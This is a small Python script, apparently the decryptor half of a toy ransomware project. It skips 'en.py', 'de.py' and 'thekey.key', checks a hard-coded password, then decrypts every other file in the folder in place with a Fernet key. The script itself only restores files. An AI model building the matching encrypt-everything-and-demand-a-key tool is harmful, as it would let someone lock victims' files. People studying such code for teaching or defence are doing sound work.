def decrypt():
    import os
    from cryptography.fernet import Fernet
    files=[]
    
    for file in os.listdir():
        if file=="en.py" or file=="thekey.key" or file=="de.py":
            continue
        if os.path.isfile(file):
            files.append(file)
    
    print(files)
    
    with open("thekey.key", "rb") as key_file:
        decrypt_key = key_file.read()
    
    key="key"
    user_key=input("Enter the key: ")
    if key==user_key:
        for file in files:
            with open(file, "rb") as thefile:
                content = thefile.read()
                decrypted_content = Fernet(decrypt_key).decrypt(content)
    
            with open(file, "wb") as thefile:
                thefile.write(decrypted_content)
                print("Key",decrypt_key)
    else:
        print("Wrong key! Try again...")